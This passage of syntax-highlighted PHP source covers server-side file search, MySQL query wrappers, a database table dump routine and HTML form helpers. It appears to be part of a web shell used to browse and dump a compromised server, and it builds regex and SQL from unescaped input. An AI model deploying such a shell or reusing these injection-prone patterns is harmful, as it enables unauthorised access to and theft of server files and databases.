<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="color: #b9ca4a;">if</span> ( <span style="color: #eaeaea; background-color: #000000;">preg_match(</span><span style="color: #70c0b1;">'@'</span>.$<span style="color: #e7c547;">content</span>.<span style="color: #70c0b1;">'@'</span>,$<span style="color: #e7c547;">file</span>) || <span style="color: #eaeaea; background-color: #000000;">preg_match(</span><span style="color: #70c0b1;">'@'</span>.$<span style="color: #e7c547;">c</span><span style="color: #e7c547; text-decoration: underline;">ontent</span><span style="text-decoration: underline;">.</span><span style="color: #70c0b1; text-decoration: underline;">'@'</span><span style="text-decoration: underline;">, @</span><span style="color: #eaeaea; background-color: #000000; text-decoration: underline;">file_get_contents(</span><span style="text-decoration: underline;">$</span><span style="color: #e7c547; text-decoration: underline;">f</span><span style="text-decoration: underline;">)) ){</span>
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   $<span style="color: #e7c547;">find</span> = <span style="color: #eaeaea; background-color: #000000;">1</span>;
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   }
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   } <span style="color: #b9ca4a;">else</span> {
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="color: #b9ca4a;">if</span> ( <span style="color: #eaeaea; background-color: #000000;">strstr(</span>$<span style="color: #e7c547;">file</span>, $<span style="color: #e7c547;">content</span>) || <span style="color: #eaeaea; background-color: #000000;">strstr(</span> @<span style="color: #eaeaea; background-color: #000000;">file_get_contents(</span>$<span style="color: #e7c547; text-decoration: underline;">f</span><span style="text-decoration: underline;">),$</span><span style="color: #e7c547; text-decoration: underline;">content</span><span style="text-decoration: underline;"> ) ) {</span>
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   $<span style="color: #e7c547;">find</span> = <span style="color: #eaeaea; background-color: #000000;">1</span>;
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   }
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   }
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="color: #b9ca4a;">if</span> ($<span style="color: #e7c547;">find</span>) {
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   $<span style="color: #e7c547;">filedata</span>[$<span style="color: #e7c547;">j</span>][<span style="color: #70c0b1;">'filename'</span>]=<span style="color: #eaeaea; background-color: #000000;">str_replace(</span>$<span style="color: #e7c547;">nowpath</span>,<span style="color: #70c0b1;">''</span>,$<span style="color: #e7c547;">f</span>);
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   $<span style="color: #e7c547;">filedata</span>[$<span style="color: #e7c547;">j</span>][<span style="color: #70c0b1;">'size'</span>]=<span style="color: #eaeaea; background-color: #000000;">sizecount(</span>@<span style="color: #eaeaea; background-color: #000000;">filesize(</span>$<span style="color: #e7c547;">f</span>));
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   $<span style="color: #e7c547;">filedata</span>[$<span style="color: #e7c547;">j</span>][<span style="color: #70c0b1;">'mtime'</span>]=<span style="color: #b9ca4a;">@date</span>(<span style="color: #70c0b1;">'Y-m-d H:i:s'</span>,<span style="color: #eaeaea; background-color: #000000;">filemtime(</span>$<span style="color: #e7c547;">f</span>));
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   $<span style="color: #e7c547;">filedata</span>[$<span style="color: #e7c547;">j</span>][<span style="color: #70c0b1;">'filechmod'</span>]=<span style="color: #eaeaea; background-color: #000000;">getChmod(</span>$<span style="color: #e7c547;">f</span>);
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   $<span style="color: #e7c547;">filedata</span>[$<span style="color: #e7c547;">j</span>][<span style="color: #70c0b1;">'fileperm'</span>]=<span style="color: #eaeaea; background-color: #000000;">getPerms(</span>$<span style="color: #e7c547;">f</span>);
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   $<span style="color: #e7c547;">filedata</span>[$<span style="color: #e7c547;">j</span>][<span style="color: #70c0b1;">'fileowner'</span>]=<span style="color: #eaeaea; background-color: #000000;">getUser(</span>$<span style="color: #e7c547;">f</span>);
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   $<span style="color: #e7c547;">filedata</span>[$<span style="color: #e7c547;">j</span>][<span style="color: #70c0b1;">'dirlink'</span>]=$<span style="color: #e7c547;">dir</span>;
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   $<span style="color: #e7c547;">filedata</span>[$<span style="color: #e7c547;">j</span>][<span style="color: #70c0b1;">'server_link'</span>]=$<span style="color: #e7c547;">f</span>;
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   $<span style="color: #e7c547;">j</span>++;
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   }
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   }
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   }
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="color: #eaeaea; background-color: #000000;">closedir(</span>$<span style="color: #e7c547;">dh</span>);
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="color: #eaeaea; background-color: #000000;">clearstatcache(</span>);
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="color: #b9ca4a;">return</span> $<span style="color: #e7c547;">filedata</span>;
<span style="background-color: #424242;"> </span>   } <span style="color: #b9ca4a;">else</span> {
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="color: #b9ca4a;">return</span> <span style="color: #eaeaea; background-color: #000000;">array(</span>);
<span style="background-color: #424242;"> </span>   }
}

<span style="color: #b9ca4a;">function</span> <span style="color: #e78c45;">qy</span>($<span style="color: #e7c547;">sql</span>) {<span style="color: #d54e53; background-color: #424242;"> </span>
<span style="background-color: #424242;"> </span>   <span style="color: #b9ca4a;">global</span> $<span style="color: #e7c547;">mysqllink</span>;
<span style="background-color: #424242;"> </span>   <span style="color: #969896; font-style: italic;">//</span><span style="color: #969896; font-style: italic;">echo $sql.'&lt;br&gt;';</span>
<span style="background-color: #424242;"> </span>   $<span style="color: #e7c547;">res</span> = $<span style="color: #e7c547;">error</span> = <span style="color: #70c0b1;">''</span>;
<span style="background-color: #424242;"> </span>   <span style="color: #b9ca4a;">if</span>(!$<span style="color: #e7c547;">res</span> = @<span style="color: #eaeaea; background-color: #000000;">mysql_query(</span>$<span style="color: #e7c547;">sql</span>,$<span style="color: #e7c547;">mysqllink</span>)) {<span style="color: #d54e53; background-color: #424242;"> </span>
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="color: #b9ca4a;">return</span> <span style="color: #eaeaea; background-color: #000000;">0</span>;
<span style="background-color: #424242;"> </span>   } <span style="color: #b9ca4a;">else</span> <span style="color: #b9ca4a;">if</span>(<span style="color: #eaeaea; background-color: #000000;">is_resource(</span>$<span style="color: #e7c547;">res</span>)) {
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="color: #b9ca4a;">return</span> <span style="color: #eaeaea; background-color: #000000;">1</span>;<span style="color: #d54e53; background-color: #424242;"> </span>
<span style="background-color: #424242;"> </span>   } <span style="color: #b9ca4a;">else</span> {
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="color: #b9ca4a;">return</span> <span style="color: #eaeaea; background-color: #000000;">2</span>;
<span style="background-color: #424242;"> </span>   }<span style="color: #d54e53; background-color: #424242;">   </span>
<span style="background-color: #424242;"> </span>   <span style="color: #b9ca4a;">return</span> <span style="color: #eaeaea; background-color: #000000;">0</span>;
}

<span style="color: #b9ca4a;">function</span> <span style="color: #e78c45;">q</span>($<span style="color: #e7c547;">sql</span>) {<span style="color: #d54e53; background-color: #424242;"> </span>
<span style="background-color: #424242;"> </span>   <span style="color: #b9ca4a;">global</span> $<span style="color: #e7c547;">mysqllink</span>;
<span style="background-color: #424242;"> </span>   <span style="color: #b9ca4a;">return</span> @<span style="color: #eaeaea; background-color: #000000;">mysql_query(</span>$<span style="color: #e7c547;">sql</span>,$<span style="color: #e7c547;">mysqllink</span>);
}

<span style="color: #b9ca4a;">function</span> <span style="color: #e78c45;">fr</span>($<span style="color: #e7c547;">qy</span>){
<span style="background-color: #424242;"> </span>   <span style="color: #eaeaea; background-color: #000000;">mysql_free_result(</span>$<span style="color: #e7c547;">qy</span>);
}

<span style="color: #b9ca4a;">function</span> <span style="color: #e78c45;">sizecount</span>($<span style="color: #e7c547;">fileSize</span>) {
<span style="background-color: #424242;"> </span>   $<span style="color: #e7c547;">size</span> = <span style="color: #eaeaea; background-color: #000000;">sprintf(</span><span style="color: #70c0b1;">"%u"</span>, $<span style="color: #e7c547;">fileSize</span>);
<span style="background-color: #424242;"> </span>   <span style="color: #b9ca4a;">if</span>($<span style="color: #e7c547;">size</span> == <span style="color: #eaeaea; background-color: #000000;">0</span>) {
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="color: #b9ca4a;">return</span> <span style="color: #70c0b1;">'0 Bytes'</span> ;
<span style="background-color: #424242;"> </span>   }
<span style="background-color: #424242;"> </span>   $<span style="color: #e7c547;">sizename</span> = <span style="color: #eaeaea; background-color: #000000;">array(</span><span style="color: #70c0b1;">' Bytes'</span>, <span style="color: #70c0b1;">' KB'</span>, <span style="color: #70c0b1;">' MB'</span>, <span style="color: #70c0b1;">' GB'</span>, <span style="color: #70c0b1;">' TB'</span>, <span style="color: #70c0b1;">' PB'</span>, <span style="color: #70c0b1;">' EB'</span>, <span style="color: #70c0b1;">' ZB'</span>,<span style="text-decoration: underline;"> </span><span style="color: #70c0b1; text-decoration: underline;">' YB'</span><span style="text-decoration: underline;">);</span>
<span style="background-color: #424242;"> </span>   <span style="color: #b9ca4a;">return</span> <span style="color: #eaeaea; background-color: #000000;">round(</span> $<span style="color: #e7c547;">size</span> / <span style="color: #eaeaea; background-color: #000000;">pow(1024</span>, ($<span style="color: #e7c547;">i</span> = <span style="color: #eaeaea; background-color: #000000;">floor(log(</span>$<span style="color: #e7c547;">size</span>, <span style="color: #eaeaea; background-color: #000000;">1024</span>)))), <span style="color: #eaeaea; background-color: #000000;">2</span>) . $<span style="color: #e7c547;">sizen</span><span style="color: #e7c547; text-decoration: underline;">ame</span><span style="text-decoration: underline;">[$</span><span style="color: #e7c547; text-decoration: underline;">i</span><span style="text-decoration: underline;">];</span>
}
<span style="color: #969896; font-style: italic;">// </span><span style="color: #969896; font-style: italic;">&#22791;&#20221;&#25968;&#25454;&#24211;</span>
<span style="color: #b9ca4a;">function</span> <span style="color: #e78c45;">sqldumptable</span>($<span style="color: #e7c547;">table</span>, $<span style="color: #e7c547;">fp</span>=<span style="color: #eaeaea; background-color: #000000;">0</span>) {
<span style="background-color: #424242;"> </span>   <span style="color: #b9ca4a;">global</span> $<span style="color: #e7c547;">mysqllink</span>;

<span style="background-color: #424242;"> </span>   $<span style="color: #e7c547;">tabledump</span> = <span style="color: #70c0b1;">"DROP TABLE IF EXISTS `$table`;\n"</span>;
<span style="background-color: #424242;"> </span>   $<span style="color: #e7c547;">res</span> = <span style="color: #eaeaea; background-color: #000000;">q(</span><span style="color: #70c0b1;">"SHOW CREATE TABLE $table"</span>);
<span style="background-color: #424242;"> </span>   $<span style="color: #e7c547;">create</span> = <span style="color: #eaeaea; background-color: #000000;">mysql_fetch_row(</span>$<span style="color: #e7c547;">res</span>);
<span style="background-color: #424242;"> </span>   $<span style="color: #e7c547;">tabledump</span> .= $<span style="color: #e7c547;">create</span>[<span style="color: #eaeaea; background-color: #000000;">1</span>].<span style="color: #70c0b1;">";\n\n"</span>;

<span style="background-color: #424242;"> </span>   <span style="color: #b9ca4a;">if</span> ($<span style="color: #e7c547;">fp</span>) {
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="color: #eaeaea; background-color: #000000;">fwrite(</span>$<span style="color: #e7c547;">fp</span>,$<span style="color: #e7c547;">tabledump</span>);
<span style="background-color: #424242;"> </span>   } <span style="color: #b9ca4a;">else</span> {
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="color: #b9ca4a;">echo</span> $<span style="color: #e7c547;">tabledump</span>;
<span style="background-color: #424242;"> </span>   }
<span style="background-color: #424242;"> </span>   $<span style="color: #e7c547;">tabledump</span> = <span style="color: #70c0b1;">''</span>;
<span style="background-color: #424242;"> </span>   $<span style="color: #e7c547;">rows</span> = <span style="color: #eaeaea; background-color: #000000;">q(</span><span style="color: #70c0b1;">"SELECT * FROM $table"</span>);
<span style="background-color: #424242;"> </span>   <span style="color: #b9ca4a;">while</span> ($<span style="color: #e7c547;">row</span> = <span style="color: #eaeaea; background-color: #000000;">mysql_fetch_assoc(</span>$<span style="color: #e7c547;">rows</span>)) {
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="color: #b9ca4a;">foreach</span>($<span style="color: #e7c547;">row</span> <span style="color: #b9ca4a;">as</span> $<span style="color: #e7c547;">k</span>=&gt;$<span style="color: #e7c547;">v</span>) {
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   $<span style="color: #e7c547;">row</span>[$<span style="color: #e7c547;">k</span>] = <span style="color: #70c0b1;">"'"</span>.@<span style="color: #eaeaea; background-color: #000000;">mysql_real_escape_string(</span>$<span style="color: #e7c547;">v</span>).<span style="color: #70c0b1;">"'"</span>;
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   }
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   $<span style="color: #e7c547;">tabledump</span> = <span style="color: #70c0b1;">'INSERT INTO `'</span>.$<span style="color: #e7c547;">table</span>.<span style="color: #70c0b1;">'` VALUES ('</span>.<span style="color: #eaeaea; background-color: #000000;">implode(</span><span style="color: #70c0b1;">", "</span>, $<span style="color: #e7c547;">row</span>).<span style="color: #70c0b1;">');</span><span style="color: #70c0b1; text-decoration: underline;">'</span><span style="text-decoration: underline;">.</span><span style="color: #70c0b1; text-decoration: underline;">"\n"</span><span style="text-decoration: underline;">;</span>
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="color: #b9ca4a;">if</span> ($<span style="color: #e7c547;">fp</span>) {
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="color: #eaeaea; background-color: #000000;">fwrite(</span>$<span style="color: #e7c547;">fp</span>,$<span style="color: #e7c547;">tabledump</span>);
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   } <span style="color: #b9ca4a;">else</span> {
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="color: #b9ca4a;">echo</span> $<span style="color: #e7c547;">tabledump</span>;
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   }
<span style="background-color: #424242;"> </span>   }
<span style="background-color: #424242;"> </span>   <span style="color: #eaeaea; background-color: #000000;">fwrite(</span>$<span style="color: #e7c547;">fp</span>,<span style="color: #70c0b1;">"\n\n"</span>);
<span style="background-color: #424242;"> </span>   <span style="color: #eaeaea; background-color: #000000;">fr(</span>$<span style="color: #e7c547;">rows</span>);
}

<span style="color: #b9ca4a;">function</span> <span style="color: #e78c45;">p</span>($<span style="color: #e7c547;">str</span>){
<span style="background-color: #424242;"> </span>   <span style="color: #b9ca4a;">echo</span> $<span style="color: #e7c547;">str</span>.<span style="color: #70c0b1;">"\n"</span>;
}

<span style="color: #b9ca4a;">function</span> <span style="color: #e78c45;">tbhead</span>() {
<span style="background-color: #424242;"> </span>   <span style="color: #eaeaea; background-color: #000000;">p(</span><span style="color: #70c0b1;">'&lt;table width="100%" border="0" cellpadding="4" cellspacing="0"&gt;'</span>);
}
<span style="color: #b9ca4a;">function</span> <span style="color: #e78c45;">tbfoot</span>(){
<span style="background-color: #424242;"> </span>   <span style="color: #eaeaea; background-color: #000000;">p(</span><span style="color: #70c0b1;">'&lt;/table&gt;'</span>);
}

<span style="color: #b9ca4a;">function</span> <span style="color: #e78c45;">makehide</span>($<span style="color: #e7c547;">name</span>,$<span style="color: #e7c547;">value</span>=<span style="color: #70c0b1;">''</span>){
<span style="background-color: #424242;"> </span>   <span style="color: #eaeaea; background-color: #000000;">p(</span><span style="color: #70c0b1;">"&lt;input id=\"$name\" type=\"hidden\" name=\"$name\" value=\"$value\" /&gt;"</span>);
}

<span style="color: #b9ca4a;">function</span> <span style="color: #e78c45;">makeinput</span>($<span style="color: #e7c547;">arg</span> = <span style="color: #eaeaea; background-color: #000000;">array(</span>)){
<span style="background-color: #424242;"> </span>   $<span style="color: #e7c547;">arg</span>[<span style="color: #70c0b1;">'size'</span>] = $<span style="color: #e7c547;">arg</span>[<span style="color: #70c0b1;">'size'</span>] &gt; <span style="color: #eaeaea; background-color: #000000;">0</span> ? <span style="color: #70c0b1;">"size=\"$arg[size]\""</span> : <span style="color: #70c0b1;">"size=\"100\""</span>;
<span style="background-color: #424242;"> </span>   $<span style="color: #e7c547;">arg</span>[<span style="color: #70c0b1;">'extra'</span>] = $<span style="color: #e7c547;">arg</span>[<span style="color: #70c0b1;">'extra'</span>] ? $<span style="color: #e7c547;">arg</span>[<span style="color: #70c0b1;">'extra'</span>] : <span style="color: #70c0b1;">''</span>;
<span style="background-color: #424242;"> </span>   !$<span style="color: #e7c547;">arg</span>[<span style="color: #70c0b1;">'type'</span>] &amp;&amp; $<span style="color: #e7c547;">arg</span>[<span style="color: #70c0b1;">'type'</span>] = <span style="color: #70c0b1;">'text'</span>;
<span style="background-color: #424242;"> </span>   $<span style="color: #e7c547;">arg</span>[<span style="color: #70c0b1;">'title'</span>] = $<span style="color: #e7c547;">arg</span>[<span style="color: #70c0b1;">'title'</span>] ? $<span style="color: #e7c547;">arg</span>[<span style="color: #70c0b1;">'title'</span>].<span style="color: #70c0b1;">'&lt;br /&gt;'</span> : <span style="color: #70c0b1;">''</span>;
<span style="background-color: #424242;"> </span>   $<span style="color: #e7c547;">arg</span>[<span style="color: #70c0b1;">'class'</span>] = $<span style="color: #e7c547;">arg</span>[<span style="color: #70c0b1;">'class'</span>] ? $<span style="color: #e7c547;">arg</span>[<span style="color: #70c0b1;">'class'</span>] : <span style="color: #70c0b1;">'input'</span>;
<span style="background-color: #424242;"> </span>   <span style="color: #b9ca4a;">if</span> ($<span style="color: #e7c547;">arg</span>[<span style="color: #70c0b1;">'newline'</span>]) {
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="color: #eaeaea; background-color: #000000;">p(</span><span style="color: #70c0b1;">"&lt;p&gt;$arg[title]&lt;input class=\"$arg[class]\" name=\"$arg[name]\" id=\"$</span><span style="color: #70c0b1; text-decoration: underline;">arg[name]\" value=\"$arg[value]\" type=\"$arg[type]\" $arg[size] $arg[extra] /&gt;&lt;/p&gt;"</span><span style="text-decoration: underline;">);</span>
<span style="background-color: #424242;"> </span>   } <span style="color: #b9ca4a;">else</span> {
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="color: #eaeaea; background-color: #000000;">p(</span><span style="color: #70c0b1;">"$arg[title]&lt;input class=\"$arg[class]\" name=\"$arg[name]\" id=\"$arg</span><span style="color: #70c0b1; text-decoration: underline;">[name]\" value=\"$arg[value]\" type=\"$arg[type]\" $arg[size] $arg[extra] /&gt;"</span><span style="text-decoration: underline;">);</span>
<span style="background-color: #424242;"> </span>   }
}

<span style="color: #b9ca4a;">function</span> <span style="color: #e78c45;">makeselect</span>($<span style="color: #e7c547;">arg</span> = <span style="color: #eaeaea; background-color: #000000;">array(</span>)){
<span style="background-color: #424242;"> </span>   <span style="color: #b9ca4a;">if</span> ($<span style="color: #e7c547;">arg</span>[<span style="color: #70c0b1;">'onchange'</span>]) {
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   $<span style="color: #e7c547;">onchange</span> = <span style="color: #70c0b1;">'onchange="'</span>.$<span style="color: #e7c547;">arg</span>[<span style="color: #70c0b1;">'onchange'</span>].<span style="color: #70c0b1;">'"'</span>;
<span style="background-color: #424242;"> </span>   }
<span style="background-color: #424242;"> </span>   $<span style="color: #e7c547;">arg</span>[<span style="color: #70c0b1;">'title'</span>] = $<span style="color: #e7c547;">arg</span>[<span style="color: #70c0b1;">'title'</span>] ? $<span style="color: #e7c547;">arg</span>[<span style="color: #70c0b1;">'title'</span>] : <span style="color: #70c0b1;">''</span>;
<span style="background-color: #424242;"> </span>   <span style="color: #b9ca4a;">if</span> ($<span style="color: #e7c547;">arg</span>[<span style="color: #70c0b1;">'newline'</span>]) <span style="color: #eaeaea; background-color: #000000;">p(</span><span style="color: #70c0b1;">'&lt;p&gt;'</span>);
<span style="background-color: #424242;"> </span>   <span style="color: #eaeaea; background-color: #000000;">p(</span><span style="color: #70c0b1;">"$arg[title] &lt;select class=\"input\" id=\"$arg[name]\" name=\"$arg[name]\"</span><span style="color: #70c0b1; text-decoration: underline;"> $onchange&gt;"</span><span style="text-decoration: underline;">);</span>
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="color: #b9ca4a;">if</span> (<span style="color: #eaeaea; background-color: #000000;">is_array(</span>$<span style="color: #e7c547;">arg</span>[<span style="color: #70c0b1;">'option'</span>])) {
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="color: #b9ca4a;">if</span> ($<span style="color: #e7c547;">arg</span>[<span style="color: #70c0b1;">'nokey'</span>]) {
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="color: #b9ca4a;">foreach</span> ($<span style="color: #e7c547;">arg</span>[<span style="color: #70c0b1;">'option'</span>] <span style="color: #b9ca4a;">as</span> $<span style="color: #e7c547;">value</span>) {
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="color: #b9ca4a;">if</span> ($<span style="color: #e7c547;">arg</span>[<span style="color: #70c0b1;">'selected'</span>]==$<span style="color: #e7c547;">value</span>) {
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="color: #eaeaea; background-color: #000000;">p(</span><span style="color: #70c0b1;">"&lt;option value=\"$value\" selected&gt;$value&lt;/option&gt;"</span>);
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   } <span style="color: #b9ca4a;">else</span> {
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="color: #eaeaea; background-color: #000000;">p(</span><span style="color: #70c0b1;">"&lt;option value=\"$value\"&gt;$value&lt;/option&gt;"</span>);
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   }
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   }
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   } <span style="color: #b9ca4a;">else</span> {
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="color: #b9ca4a;">foreach</span> ($<span style="color: #e7c547;">arg</span>[<span style="color: #70c0b1;">'option'</span>] <span style="color: #b9ca4a;">as</span> $<span style="color: #e7c547;">key</span>=&gt;$<span style="color: #e7c547;">value</span>) {
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="color: #b9ca4a;">if</span> ($<span style="color: #e7c547;">arg</span>[<span style="color: #70c0b1;">'selected'</span>]==$<span style="color: #e7c547;">key</span>) {
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="color: #eaeaea; background-color: #000000;">p(</span><span style="color: #70c0b1;">"&lt;option value=\"$key\" selected&gt;$value&lt;/option&gt;"</span>);
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   } <span style="color: #b9ca4a;">else</span> {
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="color: #eaeaea; background-color: #000000;">p(</span><span style="color: #70c0b1;">"&lt;option value=\"$key\"&gt;$value&lt;/option&gt;"</span>);
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   }
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   }
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   }
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   }
<span style="background-color: #424242;"> </span>   <span style="color: #eaeaea; background-color: #000000;">p(</span><span style="color: #70c0b1;">"&lt;/select&gt;"</span>);
<span style="background-color: #424242;"> </span>   <span style="color: #b9ca4a;">if</span> ($<span style="color: #e7c547;">arg</span>[<span style="color: #70c0b1;">'newline'</span>]) <span style="color: #eaeaea; background-color: #000000;">p(</span><span style="color: #70c0b1;">'&lt;/p&gt;'</span>);
}
<span style="color: #b9ca4a;">function</span> <span style="color: #e78c45;">formhead</span>($<span style="color: #e7c547;">arg</span> = <span style="color: #eaeaea; background-color: #000000;">array(</span>)) {
<span style="background-color: #424242;"> </span>   <span style="color: #b9ca4a;">global</span> $<span style="color: #e7c547;">self</span>;
<span style="background-color: #424242;"> </span>   !$<span style="color: #e7c547;">arg</span>[<span style="color: #70c0b1;">'method'</span>] &amp;&amp; $<span style="color: #e7c547;">arg</span>[<span style="color: #70c0b1;">'method'</span>] = <span style="color: #70c0b1;">'post'</span>;
<span style="background-color: #424242;"> </span>   !$<span style="color: #e7c547;">arg</span>[<span style="color: #70c0b1;">'action'</span>] &amp;&amp; $<span style="color: #e7c547;">arg</span>[<span style="color: #70c0b1;">'action'</span>] = $<span style="color: #e7c547;">self</span>;
<span style="background-color: #424242;"> </span>   $<span style="color: #e7c547;">arg</span>[<span style="color: #70c0b1;">'target'</span>] = $<span style="color: #e7c547;">arg</span>[<span style="color: #70c0b1;">'target'</span>] ? <span style="color: #70c0b1;">"target=\"$arg[target]\""</span> : <span style="color: #70c0b1;">''</span>;
